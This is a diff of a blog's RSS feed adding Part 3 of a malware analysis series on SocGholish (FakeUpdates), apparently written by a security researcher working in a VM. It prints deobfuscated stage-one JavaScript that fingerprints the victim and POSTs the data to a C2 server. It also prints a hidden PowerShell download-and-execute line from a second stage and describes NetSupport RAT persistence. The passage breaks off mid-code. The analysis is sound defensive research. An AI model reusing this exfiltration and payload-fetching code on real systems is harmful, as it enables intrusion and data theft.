@@ -5,8 +5,368 @@
         <description>Recent content in Posts on Reverse Engineering and Analysis</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 19 Apr 2023 10:15:56 -0500</lastBuildDate>
+        <lastBuildDate>Mon, 19 Jun 2023 07:20:21 -0500</lastBuildDate>
         <atom:link href="https://rerednawyerg.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>SocGholish Series - Part 3</title>
+            <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/</link>
+            <pubDate>Mon, 19 Jun 2023 07:20:21 -0500</pubDate>
+            
+            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/</guid>
+            <description>This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &amp;ldquo;SocGholish Series - Part 2&amp;rdquo;, I had obtained the primary, first stage JavaScript payload, titled Updates.js.
+In this writeup, I will execute the payload and observe the response(s) from the C2 server.</description>
+            <content type="html"><![CDATA[<hr>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="/js/pswp-init.js"></script>
+
+<p>This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &ldquo;SocGholish Series - Part 2&rdquo;, I had obtained the primary, first stage JavaScript payload, titled <em>Updates.js</em>.</p>
+<p>In this writeup, I will execute the payload and observe the response(s) from the C2 server.</p>
+<h2 id="updatejs-payload">Update.js Payload</h2>
+<p>To begin, let me quickly review how the payload was captured. I would recommend using the first post in the series to follow along, if desired.</p>
+<p>An interesting new wrinkle which was not present a few months ago, as far as I was aware, is the use of multiple Keitaro TDS domains as injects on a single compromised site. Here is an interesting <a href="https://infosec.exchange/@rmceoin/110449126953524134">thread</a> describing their behavior.</p>
+<p>However, for the sake of the logical flow of the series, I will not delve into this inject type in this post, and will focus on the previously identified injection type in the format:</p>
+<pre><code class="language-String" data-lang="String">&lt;script async src=&quot;https://&lt;domain&gt;/&lt;random_string_path&gt;&quot;&gt;&lt;/script&gt;
+</code></pre><h4 id="obtaining-the-payload">Obtaining the Payload</h4>
+<p>In a Windows VM, I navigated to a site on which a SocGholish inject had been identified, hxxps://www.hekl-metall[.]de.</p>
+<p>The inject:</p>
+<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/AVmNsHp77tlle7eCNmuhknIw6ZI7b7iJNm+5nCMrr4ojKfvHcTz+3nku6cB0LObYbSjnxSMk
+</code></pre><p>The second stage server responds with a large, obfuscated block of JavaScript. The JavaScript checks for various identifying aspects of the victim device, and then makes a GET request to the same second stage server:</p>
+<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/krOlC+mRxmL2kZ85pYGJKeHHwHuwiYdq/NLJcujW+m3ikYkp4JGfKf/Eh3Y=
+</code></pre><p>From here, the process is identical to what I outlined in the <a href="https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/">Fake Update Page</a> section of the first post in the series, so I will not dig into it further here.</p>
+<p>The fake update page is shown, and once the &ldquo;download&rdquo; button is clicked, the Update.js payload is added to my Downloads folder.</p>
+<h4 id="payload-contents">Payload Contents</h4>
+<p>The contents of the payload are very similar to what I described in &ldquo;SocGholish Series - Part 2&rdquo;.</p>
+<p>After removing the obfuscation and performing logical function and variable renaming, I am left with:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activeXObject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;ActiveXObject&#39;</span>](<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
+<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;open&#39;</span>](<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda[.]org/gotoCheckout&#39;</span>), <span style="color:#f92672">!</span>[]),
+<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;setRequestHeader&#39;</span>](<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>), 
+<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;send&#39;</span>](<span style="color:#e6db74">&#39;9Wc+14W1/MmSf3OfPfWgAhWibAiEEJslsZ8BcxSL3w==&#39;</span>), 
+<span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#a6e22e">get_resp_text</span>(<span style="color:#a6e22e">activeXObject</span>))
+</code></pre></div><p>The payload POSTs a hardcoded string to a C2 server, and executes the response, whatever it may be.</p>
+<h4 id="c2-server-first-response">C2 Server: First Response</h4>
+<p>Having configured tools to monitor the requests and responses to the C2 server, I executed the JS script as a normal user would, by double clicking it in the Downloads folder.</p>
+<p>Immediately, the C2 responded with a short snippet of JavaScript, which is subsequently executed.</p>
+<p>The cleaned response is below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sz</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wscript_network_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Network&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span><span style="color:#f92672">=</span>[];
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;b&#39;</span>);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">WScript</span>[<span style="color:#e6db74">&#39;ScriptFullName&#39;</span>]);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;ComputerName&#39;</span>]);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserName&#39;</span>]);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserDomain&#39;</span>]);
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">activex_obj</span>[<span style="color:#e6db74">&#39;ExpandEnvironmentStrings&#39;</span>](<span style="color:#e6db74">&#39;%userdnsdomain%&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Manufacturer&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Model&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;Version&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;SerialNumber&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiSpywareProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiVirusProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;CIM_NetworkAdapter&#39;</span>,<span style="color:#e6db74">&#39;MACAddress&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_Process&#39;</span>,<span style="color:#e6db74">&#39;Name&#39;</span>));
+<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_OperatingSystem&#39;</span>,<span style="color:#e6db74">&#39;BuildNumber&#39;</span>));
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#a6e22e">arg1</span>,<span style="color:#a6e22e">arg2</span>,<span style="color:#a6e22e">arg3</span>){
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+	<span style="color:#66d9ef">try</span>{
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">winmgmt_obj</span><span style="color:#f92672">=</span><span style="color:#a6e22e">GetObject</span>(<span style="color:#e6db74">&#34;winmgmts:\\\\.\\root\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">arg1</span>);
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">results</span><span style="color:#f92672">=</span><span style="color:#a6e22e">winmgmt_obj</span>[<span style="color:#e6db74">&#39;ExecQuery&#39;</span>](<span style="color:#e6db74">&#39;SELECT * FROM &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg2</span>,<span style="color:#e6db74">&#39;WQL&#39;</span>);
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">enumerator</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Enumerator</span>(<span style="color:#a6e22e">results</span>);
+		<span style="color:#66d9ef">for</span>(; <span style="color:#f92672">!</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;atEnd&#39;</span>](); <span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;moveNext&#39;</span>]()){
+			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">item</span><span style="color:#f92672">=</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;item&#39;</span>]();
+			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>]){
+				<span style="color:#a6e22e">ret_str</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;|&#39;</span>;
+			}
+		}
+	}
+	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
+		<span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-1&#39;</span>;
+	}
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret_str</span>;
+}
+
+<span style="color:#66d9ef">try</span>{
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c2_string</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+		<span style="color:#a6e22e">c2_string</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">array</span>[<span style="color:#a6e22e">i</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
+	}
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
+	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
+	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
+	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">c2_string</span>);
+	<span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">responseText</span>;
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">evString</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval&#39;</span>;
+	<span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">evString</span>](<span style="color:#a6e22e">resp_text</span>);
+}
+<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
+</code></pre></div><p>The purpose of this script is to &ldquo;fingerprint&rdquo; the victim device and relay the information back to the C2 server in a specific format. If the C2 responds, the response text is executed.</p>
+<p>The trouble I ran into here, is that since I was running Windows in a VM, this information would be captured in many of the WMI queries, including the manufacturer, model, and version, as well as some running processes.</p>
+<p>The C2 <em>will</em> perform checks to estimate whether their &ldquo;victim&rdquo; is a security researcher, so I&rsquo;ll have to make some adjustments in order to get a response.</p>
+<p>To quote from a fantastic <a href="https://www.proofpoint.com/us/blog/threat-insight/ta569-socgholish-and-beyond">article</a> from Proofpoint&rsquo;s Andrew Northern - &ldquo;SocGholish payloads are dynamically generated with data points about the victim being an input. This dynamic generation essentially locks each payload to each victim causing the payload to be rendered useless if it is moved to a different environment for analysis. Additionally, each payload is keyed to a specifically prefixed subdomain for command and control (C2) communication. Attempting to interact with a previously observed C2 domain with a known prefix will result in a closed connection.&rdquo;</p>
+<p>If the C2 detects that the victim is a VM, it will not respond to any requests from that IP again. Each failure means I&rsquo;ll need to use a new victim IP address and run through the whole infection chain starting with the compromised site to get a freshly generated payload.</p>
+<p><a href="https://infosec.exchange/@rmceoin/110289792904238153">Inspired once again</a> by <a href="https://infosec.exchange/@rmceoin">@rmceoin</a>, I created rules in BurpSuite to find and replace specific strings in the request body of traffic passing through the proxy.</p>
+<p>For example, the string <code>VirtualBox</code> would be replaced with <code>HP%20Z620%20Workstation</code>, <code>VBoxTray.exe</code> would be replaced with <code>svchost.exe</code>, and so on.</p>
+<p>In addition to these measures to obscure my VM from the threat actor, I also supplied a fake domain to replace the blank result returned by <code>activex_obj['ExpandEnvironmentStrings']('%userdnsdomain%')</code>. In a future post, I would like to explore the differences (if any) of the response returned by the C2 when given a domain versus no domain.</p>
+<p>After a few sessions of trial and error, I was finally able to obtain another response from the C2.</p>
+<h4 id="c2-server-second-response">C2 Server: Second Response</h4>
+<p>The C2 responded with another block of JavaScript, but interestingly, this one was not obfuscated.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">initExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">execFileName</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;7714b363.ps1&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_tempFilePathExec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">GetSpecialFolder</span>(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">execFileName</span>;
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">initExeption</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;0&#39;</span>){
+	<span style="color:#66d9ef">try</span>{
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wsh</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>);
+		<span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#a6e22e">wsh</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#e6db74">&#39;powershell -w h -c &#34;iwr -usebasicparsing http://wudugf.top/f23.svg |iex&#34;&#39;</span>,<span style="color:#ae81ff">0</span>);;
+	}
+	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
+		<span style="color:#a6e22e">runFileExeption</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;error number:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; message:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>;
+	}
+}
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span><span style="color:#f92672">=</span>[];
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;c&#39;</span>);
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">_tempFilePathExec</span>);
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileResult</span>);
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">initExeption</span>);
+<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileExeption</span>);
+<span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">req</span>);
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">requestdata</span>,<span style="color:#a6e22e">retbinary</span>){
+	<span style="color:#66d9ef">try</span>{
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">requestdata</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">param</span>,<span style="color:#a6e22e">val</span>;
+			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>]){
+				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>];
+				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">1</span>];
+			}
+			<span style="color:#66d9ef">else</span>{
+				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">i</span>;
+				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>];
+			}
+			<span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">val</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
+		}
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
+		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
+		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
+		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">payload</span>);
+		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">retbinary</span>){
+			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseBody</span>;
+		}
+		<span style="color:#66d9ef">else</span>{
+			<span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">responseText</span>;
+		}
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
+	}
+	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
+}
+</code></pre></div><p>Similar to the previous script, this will gather some info about the victim machine, format the results, and send a response back to the C2.</p>
+<p>The big difference between the two is the use of PowerShell to download and execute a file called <code>f23.svg</code>.</p>
+<p>At this point, the <code>*.nodes.gammalambdalambda.org</code> did not respond, and even if it did, there is no functionality in place to execute the response.</p>
+<p>I will now pivot my focus to the file which has been downloaded and executed via PowerShell.</p>
+<h2 id="powershell---wudugftopf23svg">PowerShell - wudugf.top/f23.svg</h2>
+<p>At first glance, the PowerShell is rather simple, there are two very large base64 encoded strings which are passed to a &ldquo;decode&rdquo; function.</p>
+<p>The decode function converts the strings from base64, and then loops through each element of the string and XORs them with an index of a hardcoded key.</p>
+<p>Once the string has been XOR&rsquo;d, it is decompressed using Gzip and returned.</p>
+<p>The first base64 string is passed to the decode function and returned to a variable I&rsquo;ve named <code>$zip_file</code> - you&rsquo;ll see why in the next section.</p>
+<p>The second base64 string is decoded and then piped to IEX - more PowerShell to explore.</p>
+<h4 id="nested-powershell">Nested PowerShell</h4>
+<p>The nested PowerShell has two primary purposes, which are seemingly unrelated to each other.</p>
+<p>One of these purposes is to extract and deploy the NetSupport RAT, which is commonly observed being deployed by SocGholish infrastructure. The specific PowerShell behavior has also been <a href="https://blogs.opentext.com/netsupport-remote-access-trojan-rat-delivered-through-fake-browser-updates-by-socgholish-threat-actors/">documented</a> by other researchers in the past.</p>
+<p>The second purpose is to deploy a separate PowerShell C2 beacon. It is interesting to see two payloads being deployed by the same C2 server, although SocGholish is known to be an initial access broker.</p>
+<h4 id="nested-powershell-first-purpose---netsupport-rat">Nested PowerShell: First Purpose - NetSupport RAT</h4>
+<p>The first primary purpose of the nested PowerShell is to extract the contents of the <code>$zip_file</code> variable using <code>[IO.Compression.Zipfile]::ExtractToDirectory</code>.</p>
+<p>This zip file will be saved to the user&rsquo;s <code>$env:appdata</code> folder under a randomly named directory.
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="images/netsupport_rat.png"  itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="images/netsupport_rat.png"
+            alt="netsupport_rat"
+            />
+    </a>
+    
+</figure>
+This zip file contains the NetSupport RAT binary as well as its dependencies.</p>
+<p>After the NetSupport RAT folder has been extracted, the <code>client32.exe</code> file is renamed to <code>whost.exe</code>.</p>
+<p>Persistence is established by adding the registry key &ldquo;ExpirienceHost&rdquo; under <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code>, with the value set to the full path of the NetSupport RAT binary.</p>
+<p>Once persistence is established, <code>Invoke-WmiMethod</code> is used to execute NetSupport RAT.</p>
+<p>NetSupport RAT has been around for quite a while, and for those curious to learn more about it, good writeups can be easily found via a web search.</p>
+<h4 id="nested-powershell-second-purpose">Nested PowerShell: Second Purpose</h4>
+<p>This is where things, in my opinion, get more interesting.</p>
+<p>The second purpose of the nested PowerShell is to deploy a PowerShell C2 beacon.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PowerShell" data-lang="PowerShell">start-process powershell -args <span style="color:#e6db74">&#39;
